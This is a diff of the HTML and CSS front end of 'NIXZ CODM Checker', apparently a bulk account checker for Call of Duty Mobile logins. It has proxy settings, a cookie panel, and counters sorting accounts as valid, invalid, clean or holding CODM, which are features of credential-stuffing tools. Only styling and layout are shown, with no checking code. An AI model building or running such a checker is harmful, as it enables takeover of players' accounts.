@@ -1,1388 +1,2016 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NIXZ CODM CHECKER - Cyberpunk Edition</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Share Tech Mono', monospace;
-            background: #0a0a0f;
-            color: #00ffff;
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-
-        /* Animated Background */
-        .cyber-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            background: 
-                linear-gradient(180deg, rgba(0, 255, 255, 0.03) 0%, transparent 100%),
-                radial-gradient(circle at 20% 50%, rgba(0, 255, 255, 0.05) 0%, transparent 50%),
-                radial-gradient(circle at 80% 50%, rgba(255, 0, 255, 0.05) 0%, transparent 50%),
-                #0a0a0f;
-        }
-
-        .cyber-bg::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: 
-                linear-gradient(rgba(0, 255, 255, 0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 255, 255, 0.03) 1px, transparent 1px);
-            background-size: 50px 50px;
-            animation: gridScroll 20s linear infinite;
-        }
-
-        @keyframes gridScroll {
-            0% { transform: translate(0, 0); }
-            100% { transform: translate(50px, 50px); }
-        }
-
-        /* Glow Lines */
-        .glow-line {
-            position: fixed;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, #00ffff, #ff00ff, transparent);
-            opacity: 0.3;
-            animation: glowPulse 4s ease-in-out infinite;
-        }
-
-        .glow-line:nth-child(1) { top: 20%; width: 60%; left: 20%; }
-        .glow-line:nth-child(2) { top: 40%; width: 40%; left: 30%; animation-delay: 2s; }
-        .glow-line:nth-child(3) { top: 60%; width: 70%; left: 15%; animation-delay: 3s; }
-        .glow-line:nth-child(4) { top: 80%; width: 50%; left: 25%; animation-delay: 1s; }
-
-        @keyframes glowPulse {
-            0%, 100% { opacity: 0.1; }
-            50% { opacity: 0.4; }
-        }
-
-        /* Container */
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 20px;
-            position: relative;
-            z-index: 1;
-        }
-
-        /* Header */
-        .header {
-            text-align: center;
-            padding: 30px 0;
-            border-bottom: 2px solid rgba(0, 255, 255, 0.3);
-            margin-bottom: 30px;
-            position: relative;
-        }
-
-        .header::after {
-            content: '';
-            position: absolute;
-            bottom: -2px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 200px;
-            height: 2px;
-            background: #ff00ff;
-            box-shadow: 0 0 20px #ff00ff, 0 0 60px #ff00ff;
-            animation: neonPulse 2s ease-in-out infinite;
-        }
-
-        @keyframes neonPulse {
-            0%, 100% { opacity: 0.5; }
-            50% { opacity: 1; }
-        }
-
-        .header h1 {
-            font-family: 'Orbitron', monospace;
-            font-size: 3em;
-            font-weight: 900;
-            background: linear-gradient(135deg, #00ffff, #ff00ff, #00ffff);
-            background-size: 300% 300%;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: gradientShift 4s ease-in-out infinite;
-            text-shadow: 0 0 40px rgba(0, 255, 255, 0.3);
-            letter-spacing: 4px;
-        }
-
-        @keyframes gradientShift {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-        }
-
-        .header .subtitle {
-            color: #888;
-            font-size: 0.9em;
-            margin-top: 10px;
-            letter-spacing: 6px;
-            text-transform: uppercase;
-        }
-
-        .header .subtitle span {
-            color: #ff00ff;
-            text-shadow: 0 0 20px rgba(255, 0, 255, 0.5);
-        }
-
-        /* Status Bar */
-        .status-bar {
-            background: rgba(0, 255, 255, 0.05);
-            border: 1px solid rgba(0, 255, 255, 0.2);
-            border-radius: 8px;
-            padding: 15px 25px;
-            margin-bottom: 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 15px;
-        }
-
-        .status-item {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 0.85em;
-        }
-
-        .status-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            display: inline-block;
-            animation: dotPulse 1.5s ease-in-out infinite;
-        }
-
-        .status-dot.online { background: #00ff00; box-shadow: 0 0 15px #00ff00; }
-        .status-dot.offline { background: #ff0000; box-shadow: 0 0 15px #ff0000; }
-        .status-dot.warning { background: #ffaa00; box-shadow: 0 0 15px #ffaa00; }
-
-        @keyframes dotPulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(0.8); }
-        }
-
-        .status-label {
-            color: #aaa;
-        }
-
-        .status-value {
-            color: #00ffff;
-            font-weight: bold;
-        }
-
-        /* Main Grid */
-        .main-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 30px;
-        }
-
-        @media (max-width: 1024px) {
-            .main-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-
-        /* Cyber Panel */
-        .cyber-panel {
-            background: rgba(0, 255, 255, 0.03);
-            border: 1px solid rgba(0, 255, 255, 0.15);
-            border-radius: 12px;
-            padding: 25px;
-            position: relative;
-            backdrop-filter: blur(10px);
-            transition: all 0.3s ease;
-        }
-
-        .cyber-panel:hover {
-            border-color: rgba(0, 255, 255, 0.3);
-            box-shadow: 0 0 30px rgba(0, 255, 255, 0.05);
-        }
-
-        .cyber-panel .panel-title {
-            font-family: 'Orbitron', monospace;
-            font-size: 0.9em;
-            font-weight: 700;
-            color: #00ffff;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 20px;
-            border-bottom: 1px solid rgba(0, 255, 255, 0.1);
-            padding-bottom: 10px;
-        }
-
-        .cyber-panel .panel-title .accent {
-            color: #ff00ff;
-        }
-
-        /* Form Elements */
-        .cyber-input {
-            width: 100%;
-            background: rgba(0, 255, 255, 0.05);
-            border: 1px solid rgba(0, 255, 255, 0.2);
-            border-radius: 6px;
-            padding: 12px 16px;
-            color: #00ffff;
-            font-family: 'Share Tech Mono', monospace;
-            font-size: 0.95em;
-            transition: all 0.3s ease;
-            outline: none;
-        }
-
-        .cyber-input:focus {
-            border-color: #ff00ff;
-            box-shadow: 0 0 20px rgba(255, 0, 255, 0.1);
-            background: rgba(255, 0, 255, 0.05);
-        }
-
-        .cyber-input::placeholder {
-            color: rgba(0, 255, 255, 0.3);
-        }
-
-        .cyber-select {
-            width: 100%;
-            background: rgba(0, 255, 255, 0.05);
-            border: 1px solid rgba(0, 255, 255, 0.2);
-            border-radius: 6px;
-            padding: 12px 16px;
-            color: #00ffff;
-            font-family: 'Share Tech Mono', monospace;
-            font-size: 0.95em;
-            outline: none;
-            cursor: pointer;
-        }
-
-        .cyber-select option {
-            background: #0a0a0f;
-            color: #00ffff;
-        }
-
-        .cyber-button {
-            background: linear-gradient(135deg, rgba(0, 255, 255, 0.15), rgba(255, 0, 255, 0.15));
-            border: 1px solid rgba(0, 255, 255, 0.3);
-            border-radius: 6px;
-            padding: 14px 30px;
-            color: #00ffff;
-            font-family: 'Orbitron', monospace;
-            font-size: 0.85em;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            width: 100%;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .cyber-button::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(0, 255, 255, 0.1) 0%, transparent 70%);
-            opacity: 0;
-            transition: opacity 0.3s ease;
-            transform: rotate(45deg);
-        }
-
-        .cyber-button:hover::before {
-            opacity: 1;
-        }
-
-        .cyber-button:hover {
-            border-color: #ff00ff;
-            box-shadow: 0 0 30px rgba(255, 0, 255, 0.2);
-            transform: translateY(-2px);
-        }
-
-        .cyber-button:active {
-            transform: translateY(0);
-        }
-
-        .cyber-button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .cyber-button .button-icon {
-            margin-right: 8px;
-        }
-
-        /* File Upload */
-        .file-upload-area {
-            border: 2px dashed rgba(0, 255, 255, 0.2);
-            border-radius: 8px;
-            padding: 40px 20px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
-        }
-
-        .file-upload-area:hover {
-            border-color: #ff00ff;
-            background: rgba(255, 0, 255, 0.05);
-        }
-
-        .file-upload-area.dragover {
-            border-color: #00ffff;
-            background: rgba(0, 255, 255, 0.05);
-            box-shadow: 0 0 40px rgba(0, 255, 255, 0.1);
-        }
-
-        .file-upload-area input[type="file"] {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0;
-            cursor: pointer;
-        }
-
-        .file-upload-area .upload-icon {
-            font-size: 3em;
-            margin-bottom: 10px;
-            display: block;
-        }
-
-        .file-upload-area .upload-text {
-            color: #888;
-        }
-
-        .file-upload-area .upload-text strong {
-            color: #00ffff;
-        }
-
-        /* Stats Display */
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
-            gap: 15px;
-            margin-top: 20px;
-        }
-
-        .stat-card {
-            background: rgba(0, 255, 255, 0.03);
-            border: 1px solid rgba(0, 255, 255, 0.1);
-            border-radius: 8px;
-            padding: 15px;
-            text-align: center;
-            transition: all 0.3s ease;
-        }
-
-        .stat-card:hover {
-            border-color: rgba(0, 255, 255, 0.3);
-            transform: translateY(-2px);
-        }
-
-        .stat-card .stat-value {
-            font-family: 'Orbitron', monospace;
-            font-size: 1.8em;
-            font-weight: 700;
-            color: #00ffff;
-            display: block;
-        }
-
-        .stat-card .stat-label {
-            font-size: 0.7em;
-            color: #888;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-top: 5px;
-        }
-
-        .stat-card.valid .stat-value { color: #00ff88; }
-        .stat-card.invalid .stat-value { color: #ff4444; }
-        .stat-card.clean .stat-value { color: #00ff88; }
-        .stat-card.codm .stat-value { color: #00ffff; }
-        .stat-card.error .stat-value { color: #ff8800; }
-
-        /* Progress Bar */
-        .progress-container {
-            margin-top: 20px;
-            background: rgba(0, 255, 255, 0.05);
-            border: 1px solid rgba(0, 255, 255, 0.1);
-            border-radius: 6px;
-            padding: 15px;
-            display: none;
-        }
-
-        .progress-container.active {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 20px;
-            background: rgba(0, 255, 255, 0.05);
-            border-radius: 10px;
-            overflow: hidden;
-            position: relative;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #00ffff, #ff00ff);
-            border-radius: 10px;
-            transition: width 0.3s ease;
-            width: 0%;
-            position: relative;
-            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
-        }
-
-        .progress-fill::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            animation: shimmer 2s infinite;
-        }
-
-        @keyframes shimmer {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-
-        .progress-info {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 10px;
-            font-size: 0.85em;
-            color: #888;
-        }
-
-        .progress-info .progress-percent {
-            color: #00ffff;
-            font-weight: bold;
-        }
-
-        /* Log Output */
-        .log-container {
-            margin-top: 20px;
-            background: rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(0, 255, 255, 0.1);
-            border-radius: 8px;
-            max-height: 400px;
-            overflow-y: auto;
-            padding: 15px;
-            font-size: 0.85em;
-            line-height: 1.6;
-        }
-
-        .log-container::-webkit-scrollbar {
-            width: 6px;
-        }
-
-        .log-container::-webkit-scrollbar-track {
-            background: rgba(0, 255, 255, 0.05);
-        }
-
-        .log-container::-webkit-scrollbar-thumb {
-            background: rgba(0, 255, 255, 0.3);
-            border-radius: 3px;
-        }
-
-        .log-entry {
-            padding: 4px 0;
-            border-bottom: 1px solid rgba(0, 255, 255, 0.03);
-            animation: logFade 0.3s ease;
-        }
-
-        @keyframes logFade {
-            from { opacity: 0; transform: translateX(-10px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
-
-        .log-entry .log-time {
-            color: #555;
-            margin-right: 15px;
-        }
-
-        .log-entry .log-valid { color: #00ff88; }
-        .log-entry .log-invalid { color: #ff4444; }
-        .log-entry .log-clean { color: #00ff88; }
-        .log-entry .log-codm { color: #00ffff; }
-        .log-entry .log-error { color: #ff8800; }
-        .log-entry .log-info { color: #888; }
-
-        /* Options Grid */
-        .options-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin: 15px 0;
-        }
-
-        @media (max-width: 600px) {
-            .options-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-
-        .option-item {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            color: #aaa;
-            font-size: 0.9em;
-        }
-
-        .option-item input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            accent-color: #ff00ff;
-            cursor: pointer;
-        }
-
-        .option-item input[type="number"] {
-            width: 60px;
-            background: rgba(0, 255, 255, 0.05);
-            border: 1px solid rgba(0, 255, 255, 0.2);
-            border-radius: 4px;
-            padding: 4px 8px;
-            color: #00ffff;
-            font-family: 'Share Tech Mono', monospace;
-            text-align: center;
-        }
-
-        /* Tabs */
-        .tab-container {
-            display: flex;
-            gap: 5px;
-            margin-bottom: 20px;
-            border-bottom: 1px solid rgba(0, 255, 255, 0.1);
-        }
-
-        .tab-button {
-            background: transparent;
-            border: none;
-            padding: 10px 20px;
-            color: #888;
-            font-family: 'Orbitron', monospace;
-            font-size: 0.75em;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            border-bottom: 2px solid transparent;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .tab-button:hover {
-            color: #00ffff;
-        }
-
-        .tab-button.active {
-            color: #00ffff;
-            border-bottom-color: #ff00ff;
-        }
-
-        .tab-content {
-            display: none;
-        }
-
-        .tab-content.active {
-            display: block;
-        }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            .header h1 {
-                font-size: 1.8em;
-            }
-            
-            .status-bar {
-                flex-direction: column;
-                align-items: stretch;
-            }
-
-            .stats-grid {
-                grid-template-columns: repeat(auto-fit, minmax(80px, 1fr));
-            }
-
-            .stat-card .stat-value {
-                font-size: 1.2em;
-            }
-
-            .container {
-                padding: 10px;
-            }
-        }
-
-        /* Scan Results Modal */
-        .result-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(10px);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-
-        .result-modal.active {
-            display: flex;
-            animation: modalFade 0.3s ease;
-        }
-
-        @keyframes modalFade {
-            from { opacity: 0; transform: scale(0.9); }
-            to { opacity: 1; transform: scale(1); }
-        }
-
-        .result-modal-content {
-            background: rgba(0, 255, 255, 0.05);
-            border: 1px solid rgba(0, 255, 255, 0.2);
-            border-radius: 12px;
-            padding: 30px;
-            max-width: 600px;
-            width: 90%;
-            max-height: 80vh;
-            overflow-y: auto;
-        }
-
-        .result-modal-content .close-btn {
-            float: right;
-            background: none;
-            border: none;
-            color: #ff4444;
-            font-size: 1.5em;
-            cursor: pointer;
-        }
-
-        .result-modal-content h2 {
-            font-family: 'Orbitron', monospace;
-            color: #00ffff;
-            margin-bottom: 15px;
-        }
-
-        .result-modal-content .result-field {
-            display: flex;
-            justify-content: space-between;
-            padding: 8px 0;
-            border-bottom: 1px solid rgba(0, 255, 255, 0.05);
-        }
-
-        .result-modal-content .result-field .label {
-            color: #888;
-        }
-
-        .result-modal-content .result-field .value {
-            color: #00ffff;
-            font-weight: bold;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NIXZ CODM Checker — Web Edition</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#0a0e17;--bg-surface:#0f1420;--bg-elevated:#141b2d;--bg-hover:#1a2238;
+  --border:#1e2740;--border-light:#2a3554;
+  --text:#e5e7eb;--text-muted:#8b95a7;--text-dim:#5a6478;
+  --primary:#06b6d4;--primary-dark:#0891b2;--primary-glow:rgba(6,182,212,.15);
+  --success:#10b981;--warning:#f59e0b;--error:#ef4444;
+  --magenta:#d946ef;--yellow:#eab308;--orange:#f97316;
+  --font-mono:'JetBrains Mono','Fira Code','Consolas',monospace;
+  --font-sans:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+}
+body{background:var(--bg);color:var(--text);font-family:var(--font-sans);font-size:14px;overflow:hidden;height:100vh}
+::-webkit-scrollbar{width:8px;height:8px}
+::-webkit-scrollbar-track{background:var(--bg-surface)}
+::-webkit-scrollbar-thumb{background:var(--border-light);border-radius:4px}
+::-webkit-scrollbar-thumb:hover{background:var(--primary-dark)}
+
+/* Layout */
+.app{display:flex;flex-direction:column;height:100vh}
+.app-body{display:flex;flex:1;overflow:hidden}
+
+/* Sidebar */
+.sidebar{width:240px;background:var(--bg-surface);border-right:1px solid var(--border);display:flex;flex-direction:column;flex-shrink:0}
+.sidebar-header{padding:20px 16px;border-bottom:1px solid var(--border)}
+.sidebar-logo{display:flex;align-items:center;gap:10px}
+.sidebar-logo .logo-icon{width:36px;height:36px;border-radius:8px;background:linear-gradient(135deg,var(--primary),var(--magenta));display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:800;color:#fff}
+.sidebar-logo .logo-text{font-size:15px;font-weight:700;letter-spacing:.5px}
+.sidebar-logo .logo-text small{display:block;font-size:10px;color:var(--text-muted);font-weight:400;letter-spacing:0}
+.sidebar-nav{flex:1;padding:12px 8px;overflow-y:auto}
+.nav-item{display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:8px;cursor:pointer;color:var(--text-muted);font-size:13px;font-weight:500;transition:all .15s;margin-bottom:2px;user-select:none}
+.nav-item:hover{background:var(--bg-hover);color:var(--text)}
+.nav-item.active{background:var(--primary-glow);color:var(--primary)}
+.nav-item .nav-icon{font-size:16px;width:20px;text-align:center}
+.sidebar-footer{padding:12px 16px;border-top:1px solid var(--border);font-size:11px;color:var(--text-dim)}
+.sidebar-footer a{color:var(--primary);text-decoration:none}
+
+/* Main */
+.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
+.content{flex:1;overflow-y:auto;padding:24px}
+.content.hidden{display:none}
+
+/* Top bar */
+.topbar{height:56px;background:var(--bg-surface);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;padding:0 20px;flex-shrink:0}
+.topbar-title{font-size:15px;font-weight:600}
+.topbar-status{display:flex;align-items:center;gap:16px;font-size:12px}
+.status-badge{display:flex;align-items:center;gap:6px;padding:4px 10px;border-radius:20px;background:var(--bg-elevated);border:1px solid var(--border)}
+.status-dot{width:8px;height:8px;border-radius:50%;background:var(--success)}
+.status-dot.idle{background:var(--text-dim)}
+.status-dot.running{background:var(--warning);animation:pulse 1.5s infinite}
+.status-dot.error{background:var(--error)}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+
+/* Cards */
+.card{background:var(--bg-surface);border:1px solid var(--border);border-radius:12px;padding:20px;margin-bottom:16px}
+.card-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
+.card-title{font-size:14px;font-weight:600;display:flex;align-items:center;gap:8px}
+.card-title .icon{font-size:18px}
+
+/* Forms */
+.form-group{margin-bottom:16px}
+.form-label{display:block;font-size:12px;font-weight:600;color:var(--text-muted);margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}
+.form-input,.form-select,.form-textarea{width:100%;background:var(--bg-elevated);border:1px solid var(--border);border-radius:8px;padding:10px 12px;color:var(--text);font-size:13px;font-family:var(--font-sans);transition:border-color .15s}
+.form-input:focus,.form-select:focus,.form-textarea:focus{outline:none;border-color:var(--primary)}
+.form-textarea{font-family:var(--font-mono);resize:vertical;min-height:120px}
+.form-row{display:flex;gap:12px}
+.form-row>*{flex:1}
+
+/* Buttons */
+.btn{padding:10px 20px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;border:none;transition:all .15s;display:inline-flex;align-items:center;gap:8px;font-family:var(--font-sans)}
+.btn-primary{background:var(--primary);color:#fff}
+.btn-primary:hover{background:var(--primary-dark)}
+.btn-primary:disabled{opacity:.5;cursor:not-allowed}
+.btn-success{background:var(--success);color:#fff}
+.btn-success:hover{filter:brightness(1.1)}
+.btn-danger{background:var(--error);color:#fff}
+.btn-warning{background:var(--warning);color:#000}
+.btn-ghost{background:var(--bg-elevated);color:var(--text);border:1px solid var(--border)}
+.btn-ghost:hover{background:var(--bg-hover)}
+.btn-sm{padding:6px 12px;font-size:12px}
+
+/* Stats grid */
+.stats-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:12px;margin-bottom:16px}
+.stat-card{background:var(--bg-elevated);border:1px solid var(--border);border-radius:10px;padding:14px}
+.stat-label{font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px}
+.stat-value{font-size:24px;font-weight:700;font-family:var(--font-mono)}
+.stat-card.green .stat-value{color:var(--success)}
+.stat-card.red .stat-value{color:var(--error)}
+.stat-card.cyan .stat-value{color:var(--primary)}
+.stat-card.yellow .stat-value{color:var(--warning)}
+.stat-card.magenta .stat-value{color:var(--magenta)}
+.stat-card.dim .stat-value{color:var(--text-dim)}
+
+/* Progress */
+.progress-bar{height:8px;background:var(--bg-elevated);border-radius:4px;overflow:hidden;margin-bottom:8px}
+.progress-fill{height:100%;background:linear-gradient(90deg,var(--primary),var(--success));transition:width .3s;border-radius:4px}
+.progress-info{display:flex;justify-content:space-between;font-size:12px;color:var(--text-muted)}
+
+/* Terminal */
+.terminal{background:#06090f;border:1px solid var(--border);border-radius:8px;font-family:var(--font-mono);font-size:12px;height:200px;overflow-y:auto;padding:12px;flex-shrink:0}
+.terminal.hidden{display:none}
+.terminal-line{padding:1px 0;word-break:break-all}
+.terminal-line .ts{color:var(--text-dim)}
+.terminal-line.info{color:var(--primary)}
+.terminal-line.success{color:var(--success)}
+.terminal-line.error{color:var(--error)}
+.terminal-line.warning{color:var(--warning)}
+.terminal-line.muted{color:var(--text-muted)}
+.terminal-line.highlight{color:var(--magenta)}
+
+/* Results table */
+.results-table{width:100%;border-collapse:collapse;font-size:12px}
+.results-table th{text-align:left;padding:8px 10px;background:var(--bg-elevated);color:var(--text-muted);font-weight:600;text-transform:uppercase;font-size:11px;letter-spacing:.5px;border-bottom:1px solid var(--border);position:sticky;top:0;z-index:1}
+.results-table td{padding:8px 10px;border-bottom:1px solid var(--border)}
+.results-table tr:hover{background:var(--bg-hover)}
+.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:600}
+.badge.clean{background:rgba(16,185,129,.15);color:var(--success)}
+.badge.notclean{background:rgba(245,158,11,.15);color:var(--warning)}
+.badge.nocodm{background:rgba(239,68,68,.15);color:var(--error)}
+.badge.invalid{background:rgba(90,100,120,.15);color:var(--text-dim)}
+.badge.error{background:rgba(239,68,68,.1);color:var(--error)}
+
+/* Toggle */
+.toggle{position:relative;display:inline-block;width:40px;height:22px}
+.toggle input{opacity:0;width:0;height:0}
+.toggle-slider{position:absolute;cursor:pointer;inset:0;background:var(--bg-elevated);border:1px solid var(--border);border-radius:22px;transition:.2s}
+.toggle-slider:before{position:absolute;content:"";height:16px;width:16px;left:2px;top:2px;background:var(--text-muted);border-radius:50%;transition:.2s}
+.toggle input:checked+.toggle-slider{background:var(--primary);border-color:var(--primary)}
+.toggle input:checked+.toggle-slider:before{transform:translateX(18px);background:#fff}
+
+/* Tabs */
+.tabs{display:flex;gap:4px;margin-bottom:16px;border-bottom:1px solid var(--border)}
+.tab{padding:8px 16px;cursor:pointer;font-size:13px;color:var(--text-muted);border-bottom:2px solid transparent;transition:all .15s}
+.tab:hover{color:var(--text)}
+.tab.active{color:var(--primary);border-bottom-color:var(--primary)}
+
+/* File drop */
+.file-drop{border:2px dashed var(--border-light);border-radius:10px;padding:32px;text-align:center;cursor:pointer;transition:all .15s}
+.file-drop:hover,.file-drop.dragover{border-color:var(--primary);background:var(--primary-glow)}
+.file-drop .icon{font-size:32px;margin-bottom:8px}
+.file-drop .text{color:var(--text-muted);font-size:13px}
+
+/* Result detail */
+.result-detail{background:var(--bg-elevated);border:1px solid var(--border);border-radius:10px;padding:16px;margin-bottom:12px;font-size:12px}
+.result-detail .detail-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
+.result-detail .detail-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px}
+.result-detail .detail-item{display:flex;gap:8px}
+.result-detail .detail-label{color:var(--text-muted);min-width:80px}
+.result-detail .detail-value{color:var(--text);font-family:var(--font-mono);word-break:break-all}
+
+/* Cookie panel */
+.cookie-panel{background:var(--bg-elevated);border:1px solid var(--border);border-radius:8px;padding:12px;margin-top:12px;font-family:var(--font-mono);font-size:11px}
+.cookie-item{display:flex;justify-content:space-between;padding:2px 0;color:var(--text-muted)}
+.cookie-item .ck-name{color:var(--primary)}
+.cookie-item .ck-value{color:var(--text);max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+
+/* Alert */
+.alert{padding:12px 16px;border-radius:8px;font-size:12px;margin-bottom:12px;display:flex;align-items:flex-start;gap:8px}
+.alert-warning{background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.3);color:var(--warning)}
+.alert-info{background:rgba(6,182,212,.1);border:1px solid rgba(6,182,212,.3);color:var(--primary)}
+.alert-error{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:var(--error)}
+
+/* Filter bar */
+.filter-bar{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
+.filter-bar .form-input{width:auto;min-width:150px}
+.filter-bar .form-select{width:auto}
+
+/* Responsive */
+@media(max-width:768px){
+  .sidebar{width:60px}
+  .sidebar-header .logo-text,.nav-item span:not(.nav-icon),.sidebar-footer{display:none}
+  .nav-item{justify-content:center}
+  .content{padding:16px}
+}
+</style>
 </head>
 <body>
-    <div class="cyber-bg"></div>
-    <div class="glow-line"></div>
-    <div class="glow-line"></div>
-    <div class="glow-line"></div>
-    <div class="glow-line"></div>
+<div class="app">
+  <div class="app-body">
+    <!-- Sidebar -->
+    <aside class="sidebar">
+      <div class="sidebar-header">
+        <div class="sidebar-logo">
+          <div class="logo-icon">N</div>
+          <div class="logo-text">NIXZ Checker<small>CODM Web Edition</small></div>
+        </div>
+      </div>
+      <nav class="sidebar-nav">
+        <div class="nav-item active" data-view="dashboard"><span class="nav-icon">📊</span><span>Dashboard</span></div>
+        <div class="nav-item" data-view="single"><span class="nav-icon">🎯</span><span>Single Check</span></div>
+        <div class="nav-item" data-view="bulk"><span class="nav-icon">📂</span><span>Bulk Check</span></div>
+        <div class="nav-item" data-view="validator"><span class="nav-icon">✓</span><span>Validator</span></div>
+        <div class="nav-item" data-view="results"><span class="nav-icon">📋</span><span>Results</span></div>
+        <div class="nav-item" data-view="settings"><span class="nav-icon">⚙</span><span>Settings</span></div>
+      </nav>
+      <div class="sidebar-footer">
+        CH: <a href="#" onclick="return false">@nixzlls</a><br>
+        <span id="proxy-status-footer">Proxy: OFF</span>
+      </div>
+    </aside>
 
-    <div class="container">
-        <!-- Header -->
-        <header class="header">
-            <h1>NIXZ CODM CHECKER</h1>
-            <div class="subtitle">
-                <span>⚡</span> CYBERPUNK EDITION <span>⚡</span><br>
-                <span style="font-size: 0.7em; color: #555;">CH: t.me/nixzllss | OWNER: @nixzlls</span>
-            </div>
-        </header>
+    <!-- Main -->
+    <div class="main">
+      <div class="topbar">
+        <div class="topbar-title" id="topbar-title">Dashboard</div>
+        <div class="topbar-status">
+          <div class="status-badge"><div class="status-dot idle" id="status-dot"></div><span id="status-text">Idle</span></div>
+          <div class="status-badge"><span id="thread-count">0</span> threads</div>
+          <div class="status-badge"><span id="speed-display">0.0</span>/s</div>
+        </div>
+      </div>
 
-        <!-- Status Bar -->
-        <div class="status-bar">
-            <div class="status-item">
-                <span class="status-dot online" id="statusDot"></span>
-                <span class="status-label">System Status:</span>
-                <span class="status-value" id="systemStatus">ONLINE</span>
+      <div class="content" id="view-dashboard">
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title"><span class="icon">📊</span> Live Statistics</div>
+            <button class="btn btn-ghost btn-sm" onclick="UI.resetStats()">Reset</button>
+          </div>
+          <div class="progress-bar"><div class="progress-fill" id="dash-progress" style="width:0%"></div></div>
+          <div class="progress-info">
+            <span id="dash-progress-text">0 / 0</span>
+            <span id="dash-eta">ETA: --</span>
+          </div>
+          <div class="stats-grid" style="margin-top:16px">
+            <div class="stat-card green"><div class="stat-label">Valid</div><div class="stat-value" id="stat-valid">0</div></div>
+            <div class="stat-card red"><div class="stat-label">Invalid</div><div class="stat-value" id="stat-invalid">0</div></div>
+            <div class="stat-card cyan"><div class="stat-label">Has CODM</div><div class="stat-value" id="stat-codm">0</div></div>
